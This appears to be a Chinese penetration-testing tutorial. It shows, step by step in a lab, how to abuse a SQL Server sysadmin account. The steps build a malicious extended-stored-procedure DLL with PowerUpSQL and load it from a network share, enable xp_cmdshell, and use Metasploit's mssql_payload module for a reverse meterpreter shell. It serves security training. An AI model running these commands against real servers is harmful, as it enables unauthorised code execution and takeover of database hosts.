SQL Server 扩展存储过程通过创建扩展存储过程引用的 DLL 文件的函数或过程。扩展存储过程在 SQL Server 内运行，这意味着代码在 SQL
Server 内存空间内执行。因此，DLL 可以具有任何文件类型扩展名，并且可以从 UNC 路径或 Webdav 加载。

###  **使用 PowerupSQL 利用扩展存储过程**

 **创建要添加到 SQL 数据库的 DLL**

    
    
    Import-Module .\Powerupsql.ps1
    Create-SQLFileXpDll -OutFile C:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc
    

在 Powerupsql 的帮助下，我们在本地机器（Windows 10）中创建了一个 dll 文件。

![image](https://image.3001.net/images/20211003/1633244629_615955d5cde6a863cec97.png!small)

###  **系统注册dll**

为了实现扩展存储过程，登录数据库的登录名必须是 sysadmin 。

通常，将创建一个名称以 xp_ 或 sp_ 开头的扩展存储过程，以便数据库引擎在用户数据库中不存在具有该名称的对象时自动在 master
数据库中查找该对象。

    
    
    Get-SQLQuery -UserName sa -Password Password@1 –Instance WIN-P83OS778EQK\SQLEXPRESS –Query "sp_addextendedproc 'xp_calc', '\\192.168.1.145\fileshare\xp_calc.dll'"
    

### **列出现有的扩展存储过程**

    
    
    Get-SQLStoredProcedureXP -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Verbose
    

下图显示了存储进程退出的 Databasename “master”。除此之外，它还列出了Type_desc, name, text.

![image](https://image.3001.net/images/20211003/1633244695_61595617b37bcbb93957f.png!small)

扩展存储过程虽然是在 master 数据库中创建，但可以从任何数据库中引用。

![image](https://image.3001.net/images/20211003/1633244762_6159565a4a23eea60edfe.png!small)

###  **执行存储过程**

    
    
    Get-SQLQuery -UserName sa -Password Password@1 –Instance WIN-P83OS778EQK\SQLEXPRESS –Query "select @@version" -Verbose
    

![image](https://image.3001.net/images/20211003/1633244819_615956932df71e9520ad0.png!small)

### **启用 XP_CMD shell**

默认情况下，XPCmdShell 被禁用，如图所示。

![image](https://image.3001.net/images/20211003/1633244910_615956ee68a34ceb774ab.png!small)

使用特权帐户，攻击者会创建一个新的存储过程，并将尝试在以下命令的帮助下启用 xpcmdshell。

    
    
    Get-SQLQuery -UserName sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')" -Verbose
    

![image](https://image.3001.net/images/20211003/1633244937_61595709a57a0a05742f3.png!small)

### **XP_CMD Shell 远程代码执行**

一旦启用了 xpcmdshell，我们就可以使用 Metasploit 执行以下模块以获得反向 shell。

    
    
    use exploit/windows/mssql/mssql_payload
    set rhosts 192.168.1.146
    set password Password@1
    exploit
    

![image](https://image.3001.net/images/20211003/1633244957_6159571ddd0725eeeb4f9.png!small)

漏洞利用并不仅仅停留在启用 XP 命令外壳上。然后运行一系列命令，帮助我们在目标机器上获得一个meterpreter shell，如下图所示

从[这里﻿](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)阅读有关 XPCmdshell 的更多信息。

